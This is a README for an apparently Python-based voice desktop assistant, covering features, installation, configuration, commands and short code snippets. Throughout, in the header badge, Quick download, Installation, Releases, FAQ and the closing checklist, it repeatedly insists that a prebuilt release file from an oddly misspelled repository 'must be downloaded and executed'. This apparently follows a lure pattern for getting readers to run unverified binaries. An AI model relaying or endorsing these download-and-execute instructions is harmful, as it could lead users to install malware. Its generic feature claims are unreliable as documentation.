[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/kamalleaner/Voice-Based-Assistanccce/releases)

# Voice Desktop Assistant: Hands-Free Automation for Daily Tasks

![Voice Assistant Banner](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1600&q=80)

A Python voice assistant that listens, understands, and acts on spoken commands. It automates common desktop tasks like opening apps, searching the web, typing text, taking screenshots, and announcing the date and time. The project uses speech recognition and text-to-speech libraries to give real-time voice feedback and a hands-free experience.

Badges
- ![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
- ![License](https://img.shields.io/badge/License-MIT-green)
- ![Status](https://img.shields.io/badge/Status-Active-brightgreen)
- ![Speech Recognition](https://img.shields.io/badge/Tech-speech--recognition-orange)
- ![TTS](https://img.shields.io/badge/Tech-text--to--speech-red)

Topics
ai-assistant · automation · desktop-assistant · natural-language-processing · open-source · personal-assistant · pyaudio · python · pyttsx3 · speech-recognition · text-to-speech · voice-assistant

Quick download
- Visit the Releases page and download the packaged file. The release file must be downloaded and executed. See the Releases section below for details.
- Releases: https://github.com/kamalleaner/Voice-Based-Assistanccce/releases

Table of contents
- About
- Features
- How it works
- Prerequisites
- Installation
  - Windows
  - macOS
  - Linux
- Configuration
- Usage
  - Start and stop
  - Common commands
  - Custom commands
- Examples
  - Scripts and snippets
  - Example session transcript
- Architecture and internals
- Voice models and engines
- Logging and debugging
- Performance tips
- Security and privacy
- Testing
- Contribution guide
- Code style
- Releases
- Changelog
- License
- Acknowledgements
- Roadmap
- FAQ
- Troubleshooting

About
This project runs on your desktop. It listens for a wake word or hotkey. It converts speech to text. It maps the text to actions. It gives voice feedback. It uses common Python libraries so you can modify logic or extend commands. The design emphasizes low-latency feedback and reliable command mapping.

Features
- Wake-word support and hotkey trigger.
- Speech recognition using local and cloud engines.
- Text-to-speech feedback with adjustable voice and rate.
- Open native apps and URLs.
- Type dictated or canned text into active windows.
- Take screenshots and save or copy them.
- Announce date and time.
- Perform web searches and open results in a browser.
- Control system volume and media playback.
- Add custom commands via a simple YAML or JSON file.
- Configurable hotkeys.
- Basic NLU: map natural phrases to actions.
- Logging for audit and debugging.
- Cross-platform support: Windows, macOS, Linux.

How it works
1. The assistant runs a main loop.  
2. It listens through the microphone.  
3. It detects the wake word or watches for a hotkey.  
4. It sends audio to a speech recognition engine.  
5. It parses the text.  
6. It matches the text to a command.  
7. It executes the action.  
8. It responds with text-to-speech.  

This flow keeps interaction direct. You speak. The program acts. The assistant returns voice feedback to confirm actions.

Prerequisites
- Python 3.8 or later.
- Microphone device.
- Internet only for optional cloud engines.
- Administrative rights for some system-level tasks on certain OSes.
- On Windows, set the default microphone and enable access.
- On macOS, allow microphone access in System Preferences.
- On Linux, ensure access to ALSA/PulseAudio.

Core libraries used
- speech_recognition — for capturing and recognizing speech.
- pyttsx3 — for local text-to-speech.
- pyaudio — for low-level audio I/O. (Alternate backend supported.)
- pocketsphinx or VOSK — for local offline recognition (optional).
- requests — for optional web queries and APIs.
- pyautogui — for GUI automation (typing, keyboard events, screenshots).
- python-dateutil — for parsing dates and time.
- PyYAML or json — for config and command mapping.

Installation

Note on releases
The Releases page hosts packaged files and executables. Download the appropriate release file for your OS. The downloaded file needs to be executed to run the prebuilt assistant. See the Releases section below.

Option A — Install from pip (recommended for source)
1. Create a virtual environment:
   - python -m venv venv
2. Activate it:
   - Windows: venv\Scripts\activate
   - macOS/Linux: source venv/bin/activate
3. Install:
   - pip install -r requirements.txt
4. Run:
   - python run_assistant.py

Option B — Use the provided release build
- Visit the Releases page and download the build that matches your OS and architecture. The downloaded file needs to be executed. See Releases for instructions and links.
- Releases: https://github.com/kamalleaner/Voice-Based-Assistanccce/releases

Windows
- Install Python 3.8+ from python.org with "Add to PATH" enabled.
- Install Microsoft Visual C++ Build Tools if you see a compile error for pyaudio.
- Use pip to install requirements.
- For a packaged build, download the .exe from Releases and run it.

macOS
- Install Python via homebrew or python.org.
- Install portaudio: brew install portaudio
- Then install requirements: pip install -r requirements.txt
- Allow microphone access in System Preferences.

Linux
- Install Python 3.8+ via the system package manager.
- Install portaudio and headers:
  - Debian/Ubuntu: sudo apt-get install libportaudio2 libportaudiocpp0 portaudio19-dev
  - Fedora: sudo dnf install portaudio-devel
- Install pulseaudio or configure ALSA.
- pip install -r requirements.txt

Configuration
The assistant uses a config file in YAML or JSON format. Copy config.example.yaml to config.yaml and edit values.

Example config keys
- wake_word: "assistant"
- tts_engine: "pyttsx3"
- recognition_engine: "sphinx"  # options: sphinx, google, vosk
- language: "en-US"
- hotkey: "ctrl+alt+a"
- responses:  # canned responses for quick replies
  - greet: "Hello. I am ready."
- screenshot:
  - path: "./screenshots"
  - format: "png"
- logging:
  - level: "INFO"
  - path: "./logs/assistant.log"

Start and stop
- Start the assistant:
  - python run_assistant.py
- For packaged builds, run the downloaded executable.
- Stop the assistant:
  - Say "stop assistant" or press the configured hotkey.
- Kill the process from the OS if needed.

Common commands
The assistant maps natural commands to actions. It supports phrase patterns and parameter extraction.

Examples (default bundle)
- "Open browser" -> open web browser
- "Open Visual Studio Code" -> open a named app
- "Search for climate news" -> open browser with search results
- "Type hello world" -> simulate typing into active window
- "Write an email" -> open your default email app
- "Take a screenshot" -> capture screen, save to folder
- "What is the time" -> say the current time
- "What is the date" -> say today's date
- "Mute volume" -> set system volume to zero
- "Set volume to 50 percent" -> adjust system volume
- "Play next song" -> media key press
- "Shut down" -> confirm and then issue system command (requires permissions)
- "Create note" -> open a note file and type dictated content
- "Run command open calculator" -> launch the calculator app

Command patterns
- The assistant uses a matcher that supports templates:
  - "open {app}"
  - "search for {query}"
  - "type {text}"
  - "screenshot {filename}"
- The matcher supports optional words:
  - "please open {app}" maps to the same action.

Custom commands
Add custom commands to config.yaml or to a commands.json file. Each entry maps a phrase to a shell script, Python function, or app path.

Example JSON
{
  "open_notepad": {
    "phrases": ["open notepad", "start notepad"],
    "action": {
      "type": "app",
      "path": "C:\\Windows\\notepad.exe"
    }
  },
  "save_clipboard": {
    "phrases": ["save clipboard as {filename}", "save buffer {filename}"],
    "action": {
      "type": "script",
      "path": "./scripts/save_clipboard.py",
      "args": ["{filename}"]
    }
  }
}

Examples

Type text into active window
- Command: "Type meeting notes: we will meet at three pm"
- Behavior:
  - The assistant speaks "Typing now."
  - It injects keystrokes to the active window.
  - It then says "Done."

Take a screenshot
- Command: "Take a screenshot of the screen"
- Behavior:
  - The assistant says "Saving screenshot."
  - It captures the primary display.
  - It saves to screenshots/ with timestamped filename.
  - It announces the save path.

Open an app by name
- Command: "Open calculator"
- Behavior:
  - It resolves the named app to a path or command.
  - It starts the app and says "Calculator opened."

Web search and read back
- Command: "Search for recent battery technology papers"
- Behavior:
  - It runs a web search with the query.
  - It opens the top result in the browser.
  - It summarizes the page title, and reads it aloud.

Session transcript
User: "Assistant, wake up"  
Assistant: "I am listening."  
User: "Open chrome"  
Assistant: "Opening Google Chrome."  
User: "Search for ambient computing research"  
Assistant: "Searching for ambient computing research."  
Assistant: "Top result: 'Ambient computing: what comes next' — opening."  

Architecture and internals

Main modules
- audio_input: handles microphone capture, buffering.
- wakeword: small detector for the wake word.
- recognition: glue to multiple recognition backends.
- nlu: intent and parameter extraction.
- action_executor: maps intents to system or app calls.
- tts: text-to-speech engine and voice control.
- gui: optional tray icon and minimal UI.
- config: loads YAML/JSON and validates settings.
- logger: rotates logs and writes action events.

Audio pipeline
- The audio_input module captures raw audio.
- A short buffer passes to wakeword.
- If the wakeword fires or hotkey triggers, audio is streamed to the chosen recognition engine.
- Recognition returns text.
- The nlu module takes the text and returns a structured intent.
- The action_executor runs the mapped action.

Recognition backends
- Local: pocketsphinx, VOSK. These run offline and keep data local.
- Cloud: Google Speech API (free tier), Microsoft, or custom HTTP endpoints. These give higher accuracy for noisy input.
- The config file selects the backend per user preference.

Text-to-speech
- The assistant supports pyttsx3 by default.
- You can plug in online TTS like gTTS or cloud TTS if you prefer higher quality voices.
- Voice, rate, and volume are configurable.

App launching
- For cross-platform launching, the assistant maintains an app registry:
  - Windows: maps friendly names to .exe paths.
  - macOS: uses open -a "AppName".
  - Linux: uses desktop files or command names.
- You can extend the registry in config.

Security and access control
- The assistant executes commands with the current user privileges.
- Restrict sensitive commands and require a confirmation phrase for system actions.
- Commands that can change system state have a built-in verification step.
- You can disable file system or system commands in config.

Voice models and engines

Offline options
- pocketsphinx: small model, limited accuracy, low resource use.
- VOSK: better accuracy, supports multiple languages, local models.

Online options
- Google Speech-to-Text: high accuracy, requires internet and API key for heavy usage.
- Microsoft Azure Speech: enterprise-grade, requires account.
- Custom HTTP endpoint: send audio as multipart POST to any recognition service.

TTS engines
- pyttsx3: offline, uses platform voices.
- gTTS: Google Text-to-Speech (requires internet).
- AWS Polly or Azure TTS: cloud TTS with high-quality voices.

Selecting a backend
- Use local engines for privacy and offline use.
- Use cloud engines for noisy environments and complex language.

Logging and debugging
- Logs write to ./logs/assistant.log with rotating file handler.
- Log levels: DEBUG, INFO, WARNING, ERROR.
- Use DEBUG for development and command mapping tuning.
- To enable detailed logs, set logging.level to DEBUG in config.yaml.

Debugging tips
- If speech recognition fails, record audio and test with the chosen backend.
- Use the included test_audio.py to record a sample and run local recognition.
- Check microphone permissions in OS settings.
- Validate config.yaml with the built-in validator:
  - python config_validator.py config.yaml

Performance tips
- Use VOSK for multi-threaded, low-latency local recognition.
- Reduce buffer sizes for faster wake-word detection.
- Use a dedicated background thread for TTS to avoid blocking.
- On low-end hardware, use lightweight models and avoid cloud roundtrips.

Security and privacy
- The assistant can run offline with local recognition and TTS if you prefer no cloud.
- Avoid using default API keys in config. Use environment variables.
- The assistant logs commands. Rotate logs and clean sensitive entries if needed.
- For shared systems, set an authentication phrase to avoid unauthorized actions.

Testing
- Unit tests cover core modules: matcher, command mapping, config parsing.
- Run tests:
  - pytest tests/
- Use the "simulator" mode to feed text directly instead of audio for fast testing:
  - python run_assistant.py --simulate "open browser"

Contribution guide
- Fork the repo.
- Create a feature branch.
- Run tests and lint before opening a pull request.
- Keep changes small and documented.
- Add a unit test for new functionality.
- Use issue templates when reporting a bug.

Code style
- Follow PEP8 for Python.
- Use type hints where practical.
- Keep functions short and focused.
- Document public functions with docstrings.

Releases
The project publishes release builds on the Releases page. Download the build for your OS. The release file needs to be downloaded and executed.

Release types
- Windows: .exe installer or portable .zip.
- macOS: .dmg or .app.tar.gz.
- Linux: AppImage, .tar.gz, or .deb.
- Source: zip or tarball of the repository.

How to use a release build
1. Go to the Releases page: https://github.com/kamalleaner/Voice-Based-Assistanccce/releases
2. Download the release asset for your OS.
3. On Windows, run the .exe installer and follow prompts, or extract the portable zip and run the included .exe.
4. On macOS, open the .dmg or extract the archive and run the app bundle.
5. On Linux, mark the AppImage as executable and run it, or install the .deb and run the binary.
6. If the release contains a script file, run it with the correct interpreter (for example, bash or python) and follow any on-screen prompts.

Release verification
- Each release lists checksums. Verify the checksum if the file integrity matters.
- The Releases page also includes release notes and changelogs for each build.

Changelog
- v1.4.0
  - Added VOSK offline support and multi-language models.
  - Improved NLU patterns and parameter parsing.
  - Added new screenshots and UI icons.
- v1.3.0
  - Added custom command registry.
  - Added JSON and YAML config support.
  - Fixed hotkey handling on macOS.
- v1.2.0
  - Added screenshot and typing actions.
  - Added session logging and debug mode.
- v1.1.0
  - Initial public release with speech recognition and TTS.

License
- MIT License. See LICENSE file in the repository.

Acknowledgements
- speech_recognition project for the recognition glue.
- pyttsx3 for offline voice.
- pyautogui for GUI automation.
- VOSK and pocketsphinx for offline models.
- Contributors who added cross-platform fixes and documentation.

Roadmap
- Add user profiles and personalized command sets.
- Add GUI for command mapping.
- Add natural language generation for richer responses.
- Add secure remote control mode for headless systems.
- Add support for voice biometrics to lock sensitive commands.

FAQ

Q: Does it work offline?
A: Yes. Use VOSK or pocketsphinx for offline recognition. Use pyttsx3 for offline TTS.

Q: What platforms does it support?
A: Windows, macOS, Linux. Some features differ by OS due to system APIs.

Q: How do I add custom apps?
A: Edit the app registry in config.yaml or add entries to the custom commands file.

Q: Does it record audio continuously?
A: It buffers audio and activates the recognition flow only on wake-word or hotkey. You can run a simulated text mode for testing.

Q: Can I change the voice?
A: Yes. Change the TTS engine settings in config.yaml. Local platform voices are available via pyttsx3. Cloud voices work with API keys.

Troubleshooting

Microphone not detected
- Verify OS microphone settings.
- Test microphone in another app.
- On Linux, check permissions and PulseAudio settings.

Speech recognition is poor
- Switch to a cloud backend if privacy allows.
- Train custom VOSK models for domain-specific terms.
- Reduce background noise or use a headset mic.

TTS does not speak
- Verify pyttsx3 installs and platform drivers.
- Try a sample script that calls pyttsx3 directly.
- On macOS, enable the correct voice in System Preferences.

App does not open
- Check the app registry for the correct path.
- On macOS, use the open -a command for app bundles.
- Check permissions.

Hotkey not working
- Ensure no system-level hotkey conflicts.
- Try another hotkey in config.yaml.

Log files grow large
- Enable log rotation in config or set a retention policy.
- Use the log cleaner script in scripts/clean_logs.py

Testing the assistant with text input
- For CI or test scripts, feed text:
  - python run_assistant.py --simulate "open calculator"

Sample code snippets

Start assistant (source)
```python
from assistant.core import Assistant
from assistant.config import load_config

cfg = load_config("config.yaml")
a = Assistant(cfg)
a.run()
```

Register a custom action
```python
def open_with_path(params):
    path = params.get("path")
    os.startfile(path)

assistant.register_action("open_path", open_with_path)
```

Add a new phrase to the matcher
```yaml
commands:
  - name: open_path
    phrases:
      - "open file {path}"
      - "show file {path}"
    action:
      type: "function"
      ref: "open_with_path"
```

Testing for CI
- Use simulate mode to bypass audio:
  - python run_assistant.py --simulate "search for AI news"

Development environment
- Use a venv and pre-commit hooks.
- Run flake8 and pytest in CI.
- Keep dependencies pinned in requirements.txt.

Contributing process
- Create an issue for a feature request or bug.
- Fork repository and create a branch named feature/<short-name> or fix/<short-name>.
- Implement tests for new behavior.
- Submit a pull request. Include a short description and link to the issue.

Contributor checklist
- Pass tests.
- Follow code style.
- Update CHANGELOG if the change is user-visible.
- Add documentation if you change behavior.

Files of interest
- run_assistant.py — entry point for source build.
- config.example.yaml — example config.
- assistant/ — core package with modules.
- scripts/ — helper scripts for testing and packaging.
- requirements.txt — pinned dependencies.
- LICENSE — license file.

Example: Build and package
- For Windows, use PyInstaller to create a single exe:
  - pyinstaller --onefile run_assistant.py --name voice-assistant
- For macOS, use PyInstaller or create a .dmg from the built app.
- For Linux, create AppImage or .deb packages.

Telemetry and opt-in data
- The assistant does not send telemetry by default.
- If you enable cloud services, audio or text may leave your machine.
- The config controls telemetry flags. Keep them off for local-only runs.

Accessibility
- The assistant helps hands-free workflows.
- Use screen reader friendly messages and short audio prompts.

Internationalization
- The assistant supports multiple languages if the chosen recognition engine supports them.
- Add translated canned responses and command phrases.

Security best practices
- Do not store API keys in config files. Use environment variables.
- Limit sensitive commands and require a confirmation step for destructive actions.
- Apply least privilege principle when running the assistant as a service.

Continuous integration
- A CI pipeline runs linting and unit tests.
- The pipeline verifies that commands map correctly in the command mapping file.

Automation tips
- Use the assistant to automate repetitive tasks like:
  - Open daily report and type a template.
  - Take a screenshot and save with a timestamp.
  - Search and open frequently used documentation pages.

Sample workflows

Daily report workflow
1. Say "Assistant, start daily report."
2. Assistant opens a template file.
3. Assistant types the current date.
4. Assistant asks for highlights, you speak, it types the text.
5. Assistant saves the file with a filename that includes the date.

Meeting capture workflow
1. Start meeting capture: "Start meeting capture."
2. Assistant opens a new note.
3. Assistant types while you speak or transcribes audio if enabled.
4. At the end, say "Stop capture" and the assistant saves and timestamps the note.

Changelog and release notes
- Maintain a changelog in CHANGELOG.md with semantic versioning.
- Annotate releases on the Releases page for download.

Where to get releases
- The project publishes builds on GitHub Releases. Download the correct asset for your platform. The download must be executed to run the packaged assistant. Visit:
- https://github.com/kamalleaner/Voice-Based-Assistanccce/releases

Contact and support
- Use the Issues tab to report bugs or request features.
- Use pull requests for code contributions.
- For fast help, include logs and the output of:
  - python run_assistant.py --diagnose

Images and visual assets
- Banner and icons: free sources such as Unsplash and open icon sets.
- Use 192x192 and 64x64 icons for desktop and tray.

Scripts and helpers
- scripts/install_deps.sh — installs OS deps on Linux.
- scripts/build_windows.bat — build helper for Windows using PyInstaller.
- scripts/test_audio.py — record sample audio and run recognition.

Example test audio flow
1. Run test_audio.py and speak the wake word.
2. The script records and saves the sample to test_audio.wav.
3. Use recognition backends to debug recognition quality.

Maintainers
- The project accepts maintainers and small teams. Add your name and contact info to MAINTAINERS.md if you join.

Legal
- The project uses third-party libraries under their licenses. Check each package license for terms that affect distribution.

Additional resources
- speech_recognition docs: https://pypi.org/project/SpeechRecognition/
- pyttsx3 docs: https://pypi.org/project/pyttsx3/
- VOSK models: https://alphacephei.com/vosk/models

FAQ (extended)

Q: Can I run multiple assistants on one machine?
A: You can run more than one instance but avoid microphone conflicts. Use separate input devices.

Q: How do I update the release build?
A: Download the newer release asset from the Releases page and run it. For source installs, git pull and pip install -r requirements.txt then restart.

Q: Does the assistant support plugins?
A: The design supports plugin-style actions. Create a plugin module and register it in config.

Q: How do I add languages?
A: Install the local model for the target language or configure the cloud recognition to use the language code.

Troubleshooting (extended)
- If a packaged build fails to launch, run from a terminal to capture stderr.
- On macOS, set execute permissions and allow the app in Security & Privacy.
- If screenshots fail, ensure the active window permissions are set for screen recording on macOS.

Scripts for common admin tasks
- scripts/clean_logs.py — removes logs older than X days.
- scripts/generate_config.py — creates a template config with local paths.
- scripts/check_dependencies.py — verifies required system libs.

Developer notes
- Keep run_assistant.py minimal and delegate logic to assistant package.
- Use dependency injection for recognition and tts engines to ease testing.
- Mock audio input for unit tests.

Example unit test
```python
def test_match_open_command():
    from assistant.matcher import Matcher
    m = Matcher()
    m.load_patterns([{"pattern": "open {app}", "intent": "open_app"}])
    result = m.match("open calculator")
    assert result.intent == "open_app"
    assert result.params["app"] == "calculator"
```

Packaging checklist
- Include required runtime libs for the chosen platform.
- Validate paths in the packaged config.
- Sign Windows executables for fewer security prompts (optional).

Final setup checklist
- Choose recognition and TTS backends.
- Edit config.yaml for hotkey and paths.
- Test microphone and TTS.
- Add custom commands you need for daily tasks.
- Use the Releases page for prebuilt files. The downloaded release file needs to be executed. See:
- https://github.com/kamalleaner/Voice-Based-Assistanccce/releases

End of README